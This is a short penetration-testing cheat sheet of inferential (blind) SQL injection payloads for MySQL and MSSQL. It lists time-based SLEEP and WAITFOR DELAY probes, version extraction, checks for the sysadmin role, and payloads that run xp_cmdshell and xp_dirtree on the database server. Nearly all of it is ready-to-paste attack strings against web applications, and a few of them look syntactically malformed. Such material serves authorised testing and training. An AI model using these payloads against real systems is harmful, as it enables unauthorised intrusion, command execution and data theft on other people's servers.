# Inferential SQL Queries

Search Tag(s): #helpers #blind-sql-injection #webapp

## MySQL

Inject time-based blind payloads

```
' OR IF(1=1, SLEEP(5), 0)#
```

Grab version

```
' OR IF(1=1, SLEEP(5), 0) UNION SELECT (SELECT version())#
```

## MSSQL

```
' IF (SELECT IS_SRVROLEMEMBER('sysadmin')) = 1 EXEC xp_cmdshell('echo Enabled')

' IF (SELECT CASE WHEN (SELECT IS_SRVROLEMEMBER('sysadmin')) = 1 THEN WAITFOR DELAY '0:0:16' ELSE 0 END) = 1

' IF (SELECT IS_SRVROLEMEMBER('sysadmin')) = 0 EXEC xp_cmdshell('echo Disabled')

' IF (SELECT IS_SRVROLEMEMBER('sysadmin')) = 0 WAITFOR DELAY '0:0:16' ELSE 0 END) = 1

' IF (SELECT SUBSTRING(@@version, 1, 1)) = '1' WAITFOR DELAY '0:0:16'

' OR 1=1; EXEC xp_dirtree 'C:\your_target_directory', 1, 1;-- -
```

---
## References

- [WebSec: SQL Injection Knowledge Base](https://www.websec.ca/kb/sql_injection)